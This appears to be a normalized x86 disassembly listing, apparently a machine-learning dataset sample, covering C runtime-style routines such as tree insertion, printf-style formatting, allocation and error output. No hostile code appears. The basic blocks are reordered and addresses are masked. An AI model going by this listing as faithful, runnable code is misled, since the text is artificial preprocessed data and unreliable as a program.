test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_4022f1
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_40ed6e
mov [ esi + 0x4 ] eax
sub_407860
push ebp
mov ebp esp
sub esp 0x14
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
mov edi [ eax + 0x4 ]
cmp [ edi + 0x31 ] 0x0
mov esi eax
mov al 0x1
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] al
jne r-xdata
mov edi esi
test al al
je r-xdata
mov eax [ ebx + 0x1c ]
mov ecx [ ebx + 0x20 ]
mov edx eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
mov [ ebp - 0x14 ] ecx
jmp r-xdata
cmp [ ebx + 0x20 ] 0x10
lea eax [ ebx + 0xc ]
mov ebx [ eax + 0x10 ]
lea edx [ edi + 0xc ]
jb r-xdata
mov eax [ edx + 0x4 ]
cmp esi [ eax ]
jne r-xdata
cmp [ edi + 0x20 ] 0x10
mov ebx [ edi + 0x1c ]
mov [ ebp - 0x4 ] edi
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
cmp [ esi + 0x31 ] 0x0
je r-xdata
push ebx
push 0x1
lea ecx [ ebp + 0x10 ]
push ecx
mov ecx esi
mov eax edx
call sub_406af0
mov edx [ eax ]
mov eax [ ebp + 0xc ]
pop edi
pop esi
mov [ eax ] edx
mov [ eax + 0x4 ] 0x1
pop ebx
mov esp ebp
pop ebp
retn 0xc
lea ecx [ edi + 0xc ]
mov ecx [ edi + 0xc ]
jmp r-xdata
mov eax esi
cmp esi ebx
jb r-xdata
mov esi [ edx + 0x10 ]
mov eax esi
cmp eax esi
jae r-xdata
mov ecx [ esi ]
cmp [ ecx + 0x31 ] 0x0
jne r-xdata
mov edi [ esi + 0x8 ]
jmp r-xdata
mov eax esi
cmp esi ebx
jb r-xdata
mov esi edx
mov esi [ ebp - 0x10 ]
cmp edx esi
jae r-xdata
cmp [ edx + 0x14 ] 0x10
jb r-xdata
mov eax ebx
mov eax [ esi + 0x4 ]
cmp [ eax + 0x31 ] 0x0
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x31 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x10
mov edx [ ebp + 0x10 ]
jb r-xdata
mov eax ebx
call sub_4025a0
test eax eax
jne r-xdata
mov edx [ edx ]
cmp [ edi + 0x31 ] 0x0
jne r-xdata
lea ecx [ ecx ]
mov edi ecx
jmp r-xdata
mov ecx eax
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x31 ] 0x0
je r-xdata
add edx 0xc
mov edx [ edx + 0xc ]
jmp r-xdata
jns r-xdata
cmp esi ebx
jb r-xdata
mov edi eax
mov edi eax
mov eax [ eax + 0x4 ]
cmp [ eax + 0x31 ] 0x0
je r-xdata
sets al
mov [ ebp - 0x8 ] al
test al al
je r-xdata
cmp esi ebx
jae r-xdata
call sub_4025a0
test eax eax
jne r-xdata
mov esi [ ebp + 0x10 ]
cmp [ esi + 0x20 ] 0x10
jb r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
lea edx [ ebp + 0x10 ]
push edx
call sub_406af0
mov ecx [ eax ]
mov eax [ ebp + 0xc ]
pop edi
pop esi
mov [ eax ] ecx
mov [ eax + 0x4 ] 0x1
pop ebx
mov esp ebp
pop ebp
retn 0xc
cmp esi ebx
setne al
test eax eax
cmp edi [ eax ]
jne r-xdata
mov edi [ edi + 0x8 ]
mov edi [ edi ]
jmp r-xdata
xor eax eax
cmp esi ebx
setne al
or eax 0xffffffff
jmp r-xdata
mov eax esi
mov [ esi + 0x20 ] 0xf
mov [ esi + 0x1c ] 0x0
push eax
mov [ esi + 0xc ] 0x0
call sub_408b16
mov eax [ ebp + 0xc ]
add esp 0x4
mov [ eax ] edi
pop edi
pop esi
mov [ eax + 0x4 ] 0x0
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edx [ esi + 0xc ]
push edx
call sub_408b16
add esp 0x4
mov edx [ ebp - 0xc ]
mov ebx [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
mov esi [ ebp - 0x4 ]
cmp [ edi + 0x31 ] 0x0
je r-xdata
test eax eax
sub_407a4a
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_40a7fb
mov edi eax
xor ebx ebx
pop ecx
mov [ ebp - 0x1fc ] edi
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_401400
leave
retn
push 0x3
call sub_406909
pop ecx
cmp eax 0x1
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0x3
call sub_406909
pop ecx
test eax eax
jne r-xdata
cmp esi 0xffffffff
je r-xdata
cmp esi 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
xor eax eax
push r--data
push 0x314
mov edi rw-data
push edi
call sub_413100
add esp 0xc
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
push eax
mov [ ebp - 0x5 ] bl
call sub_413e90
pop ecx
push eax
lea eax [ ebp - 0x1f8 ]
push eax
push esi
call [ WriteFile@IAT ]
inc eax
cmp eax 0x1f4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov ebx 0x2fb
test eax eax
jne r-xdata
mov cl [ edi + eax * 2 ]
mov [ ebp + eax - 0x1f8 ] cl
cmp [ edi + eax * 2 ] bx
je r-xdata
call sub_402acd
push esi
call sub_40249b
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push ebx
push esi
call sub_413100
add esp 0xc
test eax eax
je r-xdata
push r--data
mov esi 0x314
push esi
push edi
call sub_40136d
add esp 0xc
test eax eax
jne r-xdata
push esi
call sub_40249b
lea eax [ eax * 2 + rw-data ]
mov ecx eax
sub ecx esi
push 0x3
sar ecx 0x1
push r--data
sub ebx ecx
push ebx
push eax
call sub_4010d1
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
push [ ebp - 0x1fc ]
push esi
push edi
call sub_40136d
add esp 0xc
test eax eax
jne r-xdata
push 0x12010
push r--data
push edi
call sub_40559b
add esp 0xc
jmp r-xdata
sub_407c01
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
imul ecx [ ebp + 0xc ]
push esi
mov esi ecx
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_40f84f
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push esi
call sub_411115
pop ecx
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov [ ecx ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
sub_407c83
mov edi edi
push ebp
mov ebp esp
sub esp 0x478
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x458 ]
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x420 ] edi
mov [ ebp - 0x444 ] ebx
mov [ ebp - 0x408 ] ebx
mov [ ebp - 0x430 ] ebx
mov [ ebp - 0x40c ] ebx
mov [ ebp - 0x428 ] ebx
mov [ ebp - 0x448 ] ebx
mov [ ebp - 0x42c ] ebx
call sub_407759
call sub_40f84f
mov [ ebp - 0x464 ] eax
cmp [ ebp - 0x424 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
call sub_40f84f
mov [ eax ] 0x16
call sub_40c515
cmp [ ebp - 0x44c ] bl
movzx ecx [ esi ]
xor edx edx
mov [ ebp - 0x418 ] ebx
mov [ ebp - 0x414 ] ebx
mov [ ebp - 0x43c ] ebx
mov [ ebp - 0x41c ] ecx
cmp cx bx
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x450 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x44c ] 0x0
je r-xdata
push 0x2
pop ebx
add esi ebx
cmp [ ebp - 0x418 ] 0x0
mov [ ebp - 0x440 ] esi
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_401400
leave
retn
mov eax [ ebp - 0x418 ]
mov eax [ ebp - 0x450 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ ecx - 0x20 ]
cmp ax 0x58
ja r-xdata
xor eax eax
movzx eax cx
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov esi [ ebp - 0x440 ]
movzx eax [ esi ]
mov [ ebp - 0x41c ] eax
test ax ax
je r-xdata
jmp [ eax * 4 + jump_table_40882b ]
movsx eax [ edx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop edx
mov [ ebp - 0x460 ] eax
cmp eax edx
ja r-xdata
mov edx [ ebp - 0x460 ]
mov edi [ ebp - 0x420 ]
mov ecx eax
jmp r-xdata
xor eax eax
or [ ebp - 0x40c ] 0xffffffff
mov [ ebp - 0x468 ] eax
mov [ ebp - 0x448 ] eax
mov [ ebp - 0x430 ] eax
mov [ ebp - 0x428 ] eax
mov [ ebp - 0x408 ] eax
mov [ ebp - 0x42c ] eax
jmp r-xdata
movzx eax cx
sub eax 0x20
je r-xdata
cmp cx 0x2a
jne r-xdata
and [ ebp - 0x40c ] 0x0
jmp r-xdata
cmp cx 0x2a
jne r-xdata
movzx eax cx
cmp eax 0x49
je r-xdata
mov eax [ ebp - 0x424 ]
push ecx
lea esi [ ebp - 0x418 ]
mov [ ebp - 0x42c ] 0x1
call sub_414256
jmp r-xdata
movzx eax cx
cmp eax 0x64
jg r-xdata
or [ ebp - 0x408 ] ebx
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x430 ]
imul eax eax 0xa
movzx ecx cx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x430 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x420 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x430 ] edi
test edi edi
jns r-xdata
mov eax [ ebp - 0x40c ]
imul eax eax 0xa
movzx ecx cx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x40c ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x420 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x40c ] edi
test edi edi
jns r-xdata
movzx eax [ esi ]
cmp eax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
pop ecx
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
or [ ebp - 0x408 ] 0x4
neg [ ebp - 0x430 ]
jmp r-xdata
or [ ebp - 0x40c ] 0xffffffff
jmp r-xdata
cmp eax 0x33
jne r-xdata
cmp [ esi + 0x2 ] 0x34
jne r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
cmp eax 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x408 ] 0x1
jmp r-xdata
sub eax ebx
je r-xdata
cmp eax 0x64
je r-xdata
cmp [ esi + 0x2 ] 0x32
jne r-xdata
add esi 0x4
or [ ebp - 0x408 ] 0x8000
mov [ ebp - 0x440 ] esi
jmp r-xdata
cmp [ esi ] 0x6c
jne r-xdata
cmp eax 0x77
jne r-xdata
mov ebx [ ebp - 0x40c ]
cmp ebx 0xffffffff
jne r-xdata
sub eax ebx
je r-xdata
mov [ ebp - 0x40c ] 0x8
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
mov eax [ edi ]
mov edx [ edi + 0x4 ]
add edi 0x8
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp eax 0x69
je r-xdata
add esi 0x4
and [ ebp - 0x408 ] 0xffff7fff
mov [ ebp - 0x440 ] esi
jmp r-xdata
or [ ebp - 0x408 ] 0x10
jmp r-xdata
add esi ebx
or [ ebp - 0x408 ] 0x1000
mov [ ebp - 0x440 ] esi
jmp r-xdata
or [ ebp - 0x408 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x420 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x410 ] edi
je r-xdata
mov ebx 0x7fffffff
mov [ ebp - 0x41c ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x41c ] 0x10
je r-xdata
cmp [ ebp - 0x448 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x420 ] edi
mov [ ebp - 0x444 ] edx
jmp r-xdata
sub eax ebx
je r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x408 ] 0x8
jmp r-xdata
cmp eax 0x6f
je r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebp - 0x444 ] 0x27
mov ecx [ ebp - 0x408 ]
test ecx 0x8000
je r-xdata
push 0x30
pop eax
mov [ ebp - 0x434 ] ax
mov eax [ ebp - 0x444 ]
add eax 0x51
mov [ ebp - 0x432 ] ax
mov [ ebp - 0x428 ] ebx
jmp r-xdata
cmp [ ebp - 0x43c ] 0x0
je r-xdata
mov eax [ ebp - 0x408 ]
test al 0x40
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp [ ebp - 0x40c ] 0x0
lea ebx [ ebp - 0x404 ]
mov eax 0x200
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x414 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
mov eax [ edi - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x420 ] edi
test cl 0x40
je r-xdata
test [ ebp - 0x408 ] 0x9000
mov edi edx
mov ebx eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x420 ] edi
test eax eax
je r-xdata
sub eax edx
je r-xdata
or [ ebp - 0x408 ] 0x20
add ecx 0x20
mov [ ebp - 0x468 ] 0x1
mov [ ebp - 0x41c ] ecx
sub eax ebx
je r-xdata
cmp eax 0x75
je r-xdata
mov eax [ ebp - 0x410 ]
mov [ ebp - 0x42c ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
and [ ebp - 0x414 ] 0x0
mov esi [ ebp - 0x410 ]
test ebx ebx
jle r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push [ ebp - 0x43c ]
call sub_40ab76
and [ ebp - 0x43c ] 0x0
mov edi [ ebp - 0x430 ]
sub edi [ ebp - 0x414 ]
sub edi [ ebp - 0x428 ]
mov [ ebp - 0x41c ] edi
test al 0xc
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x40c ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x40c ] 0x0
jge r-xdata
xor edi edi
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
sub eax ebx
jne r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax ebx
je r-xdata
cmp eax 0x78
je r-xdata
test ebx ebx
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
push [ ebp - 0x428 ]
mov edi [ ebp - 0x464 ]
mov ebx [ ebp - 0x424 ]
lea eax [ ebp - 0x434 ]
push eax
lea eax [ ebp - 0x418 ]
call sub_414285
test [ ebp - 0x408 ] 0x8
pop ecx
pop ecx
je r-xdata
jmp r-xdata
test al 0x1
je r-xdata
push 0x2d
jmp r-xdata
cmp [ ebp - 0x40c ] eax
jle r-xdata
cmp [ ebp - 0x41c ] 0x67
jne r-xdata
mov eax [ edi ]
mov esi [ DecodePointer@IAT ]
add edi 0x8
mov [ ebp - 0x470 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x46c ] eax
lea eax [ ebp - 0x458 ]
push eax
push [ ebp - 0x468 ]
movsx eax [ ebp - 0x41c ]
push [ ebp - 0x40c ]
mov [ ebp - 0x420 ] edi
push eax
push [ ebp - 0x414 ]
lea eax [ ebp - 0x470 ]
push ebx
push eax
push [ rw-data ]
call esi
call eax
mov edi [ ebp - 0x408 ]
add esp 0x1c
and edi 0x80
je r-xdata
mov esi [ edi ]
add edi 0x4
mov [ ebp - 0x420 ] edi
call sub_401b65
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x408 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x40c ] eax
jle r-xdata
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x408 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x414 ] eax
test [ ebp - 0x408 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x410 ] ecx
je r-xdata
movzx eax [ edi ]
add edi 0x4
xor esi esi
inc esi
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x42c ] esi
mov [ ebp - 0x420 ] edi
mov [ ebp - 0x45c ] eax
je r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
sub eax ebx
jne r-xdata
cmp eax 0x58
je r-xdata
dec ebx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x410 ]
lea ecx [ ebp - 0x458 ]
movzx eax al
push ecx
push eax
call sub_40dda0
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x42c ] 0x0
jne r-xdata
test [ ebp - 0x408 ] 0x4
jne r-xdata
test edi edi
jg r-xdata
test al 0x2
je r-xdata
push 0x2b
jmp r-xdata
pop ecx
mov [ ebp - 0x434 ] cx
mov [ ebp - 0x428 ] 0x1
cmp [ ebp - 0x40c ] 0xa3
jle r-xdata
mov [ ebp - 0x40c ] eax
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
cmp [ ebp - 0x41c ] 0x67
jne r-xdata
cmp [ ebp - 0x40c ] 0x0
jne r-xdata
call sub_40f84f
mov [ eax ] 0x16
call sub_40c515
cmp [ ebp - 0x44c ] 0x0
jmp r-xdata
test [ ebp - 0x408 ] 0x20
je r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x41c ] 0x8
je r-xdata
mov eax ebx
or eax edi
jne r-xdata
mov [ ebp - 0x40c ] eax
and [ ebp - 0x42c ] 0x0
jmp r-xdata
cdq
sub eax edx
mov [ ebp - 0x42c ] 0x1
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x438 ] al
lea eax [ ebp - 0x458 ]
push eax
mov eax [ ebp - 0x458 ]
mov [ ebp - 0x437 ] 0x0
push [ eax + 0xac ]
lea eax [ ebp - 0x438 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_404477
add esp 0x10
test eax eax
jns r-xdata
and [ ebp - 0x460 ] 0x0
add eax 0x2
inc esi
inc [ ebp - 0x414 ]
cmp [ ebp - 0x414 ] ebx
jl r-xdata
inc esi
push [ ebp - 0x414 ]
mov edi [ ebp - 0x464 ]
push [ ebp - 0x410 ]
mov ebx [ ebp - 0x424 ]
lea eax [ ebp - 0x418 ]
call sub_414285
pop ecx
pop ecx
mov ebx [ ebp - 0x414 ]
test ebx ebx
jle r-xdata
mov edi [ ebp - 0x41c ]
jmp r-xdata
mov eax [ ebp - 0x424 ]
push 0x20
lea esi [ ebp - 0x418 ]
dec edi
call sub_414256
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
push 0x20
mov esi [ ebp - 0x40c ]
add esi 0x15d
push esi
call sub_402a4b
pop ecx
mov [ ebp - 0x43c ] eax
test eax eax
je r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x458 ]
push eax
push ebx
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
je r-xdata
mov eax [ ebp - 0x418 ]
mov [ esi ] eax
mov ax [ ebp - 0x418 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x408 ] 0x200
jmp r-xdata
lea esi [ ebp - 0x205 ]
and [ ebp - 0x428 ] eax
sar eax 0x1
lea eax [ ebp - 0x404 ]
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
jmp r-xdata
mov [ ebp - 0x448 ] esi
jmp r-xdata
jmp r-xdata
test [ ebp - 0x408 ] 0x4
je r-xdata
mov edi [ ebp - 0x410 ]
test edi edi
jg r-xdata
mov [ ebp - 0x40c ] 0xa3
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
mov ebx eax
jmp r-xdata
push ebx
jmp r-xdata
or [ ebp - 0x408 ] 0x100
inc ebx
mov [ ebp - 0x410 ] ebx
lea eax [ ebp - 0x458 ]
push eax
push ebx
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov [ ebp - 0x448 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x41c ]
cdq
push edx
push eax
push edi
push ebx
call sub_4156f0
add ecx 0x30
mov [ ebp - 0x474 ] ebx
mov ebx eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ebx
or eax edi
je r-xdata
mov edi [ ebp - 0x41c ]
jmp r-xdata
or [ ebp - 0x418 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x45c ]
mov eax [ ebp - 0x424 ]
lea esi [ ebp - 0x418 ]
call sub_414256
add edi [ ebp - 0x474 ]
pop ecx
test ebx ebx
jg r-xdata
push 0x30
lea esi [ ebp - 0x418 ]
mov eax ebx
dec edi
call sub_414256
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
call sub_413e90
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x444 ]
lea eax [ ebp - 0x205 ]
sub eax esi
inc esi
test [ ebp - 0x408 ] 0x200
mov [ ebp - 0x414 ] eax
mov [ ebp - 0x410 ] esi
je r-xdata
test edi edi
jg r-xdata
cmp [ ebp - 0x418 ] 0x0
jl r-xdata
lea eax [ ebp - 0x458 ]
push eax
mov eax [ ebp - 0x458 ]
push [ eax + 0xac ]
lea eax [ ebp - 0x45c ]
push edi
push eax
dec ebx
call sub_404477
add esp 0x10
mov [ ebp - 0x474 ] eax
test eax eax
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x40c ]
dec [ ebp - 0x40c ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
mov eax [ ebp - 0x424 ]
push 0x20
lea esi [ ebp - 0x418 ]
dec edi
call sub_414256
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
dec [ ebp - 0x410 ]
mov eax [ ebp - 0x410 ]
inc [ ebp - 0x414 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax esi
cmp [ eax ] 0x30
je r-xdata
sub_408850
push ebp
mov ebp esp
sub esp 0x10
push 0x18
mov [ esi + 0x8 ] 0x0
call sub_4066cf
add esp 0x4
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_40140f
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_4037cf
int3
mov [ esi + 0x4 ] eax
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ esi + 0x4 ]
mov al 0x1
mov [ ecx + 0x14 ] al
mov edx [ esi + 0x4 ]
mov [ edx + 0x15 ] al
mov eax esi
mov esp ebp
pop ebp
retn
sub_4088c8
push 0xc
push r--data
call sub_413ff0
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_40c4dc
push 0x1e
call sub_407a4a
push 0xff
call sub_40b064
push 0x18
call sub_402a4b
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_40723f
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_40f84f
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_414035
retn
push edi
call sub_40ab76
pop ecx
push 0xfa0
push edi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_40ab76
pop ecx
call sub_40f84f
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_408981
mov eax [ ebp - 0x1c ]
sub_408990
push ebp
mov ebp esp
push 0xffffffff
push sub_416128
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
lea esi [ ecx + 0x4 ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea edi [ ebp - 0x14 ]
call sub_411a50
mov eax [ esi + 0x4 ]
push eax
call sub_408b16
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_408a33
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x40
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx edi
je r-xdata
push esi
call sub_402116
pop ecx
mov edx rw-data
cmp eax edi
je r-xdata
mov eax edi
mov eax [ esi + 0xc ]
test al 0x1
jne r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
test al al
jns r-xdata
call sub_40f84f
mov [ eax ] 0x16
call sub_40c515
cmp eax edi
je r-xdata
mov ecx eax
and ecx 0x1f
mov ebx eax
sar ebx 0x5
shl ecx 0x6
add ecx [ ebx * 4 + rw-data ]
jmp r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
push esi
call sub_40d42e
pop ecx
test al 0x2
jne r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
dec [ esi ]
test [ esi + 0xc ] 0x40
mov eax [ esi ]
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov [ eax ] bl
cmp [ eax ] bl
je r-xdata
inc eax
mov [ esi ] eax
test [ eax + 0x24 ] 0x80
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0xc ]
inc [ esi + 0x4 ]
and eax 0xffffffef
or eax 0x1
mov [ esi + 0xc ] eax
mov eax ebx
and eax 0xff
jmp r-xdata
inc eax
mov [ esi ] eax
jmp r-xdata
sub_408b30
mov ecx [ rw-data ]
mov edx [ rw-data ]
sub ecx edx
sar ecx 0x3
cmp ecx 0x1ffffffe
jbe r-xdata
mov eax [ rw-data ]
sub eax edx
inc ecx
sar eax 0x3
cmp ecx eax
jbe r-xdata
push r--data
call sub_40458d
retn
push esi
mov edx eax
shr edx 0x1
mov esi 0x1fffffff
sub esi edx
cmp esi eax
pop esi
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
mov ecx eax
jmp sub_402040
mov eax ecx
cmp eax ecx
jae r-xdata
sub_408b90
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_408b16
add esp 0x4
